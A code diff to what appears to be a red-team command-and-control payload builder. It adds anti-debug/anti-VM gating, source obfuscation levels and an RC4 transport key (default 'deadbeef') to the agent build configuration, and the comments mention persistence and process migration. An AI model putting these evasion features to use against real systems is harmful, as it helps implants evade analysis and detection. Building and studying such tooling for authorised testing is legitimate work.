@@ -122,6 +122,18 @@ class PayloadConfig:
     # persistence. An agent built without it answers `screenshot` with
     # "unknown action" rather than pretending.
     screenshot: bool = False
+    # VM/sandbox detection gate. Off by default: a lab run of a fresh payload
+    # must not die on a sandbox check it was never asked for. When on, the PE
+    # template compiles in an anti-debug/anti-VM block that exits at startup.
+    anti_analysis: bool = False
+    # Source-level obfuscation level: "none" | "light" | "medium" | "heavy" |
+    # path-to-module. Transforms how the source reads; the built agent's
+    # runtime behaviour is unchanged.
+    obfuscation: Optional[str] = None
+    # RC4 transport key. Precedence: this field > dns_key > config
+    # payloads.pe_rc4_key > built-in default "deadbeef". Empty string is
+    # legitimate: it selects the plaintext wire (no RC4 framing).
+    rc4_key: str = ""
     # Process migration is compiled in by default, matching every payload built to
     # date: it changes no on-target behaviour unless tasked, so leaving it on
     # preserves current payloads. An operator can still pass migration=False for a
@@ -523,6 +535,9 @@ class PayloadBuilder:
                         tls=tls_on,
                         tls_cert_pem=tls_cert_pem,
                         auth_secret=auth_secret,
+                        anti_analysis=payload_config.anti_analysis,
+                        obfuscation=payload_config.obfuscation,
+                        rc4_key=payload_config.rc4_key,
                     )
                     pe_result = await pe_build.build(stub_cfg, artifact_path.with_suffix('.exe'))
                     if pe_result.status == "built":
@@ -558,6 +573,9 @@ class PayloadBuilder:
                     tls=tls_on,
                     tls_cert_pem=tls_cert_pem,
                     auth_secret=auth_secret,
+                    anti_analysis=payload_config.anti_analysis,
+                    obfuscation=payload_config.obfuscation,
+                    rc4_key=payload_config.rc4_key,
                 )
                 agent_code = stub_gen.generate(stub_cfg)
                 src_path = artifact_path.parent / f"{artifact_path.name}.py"
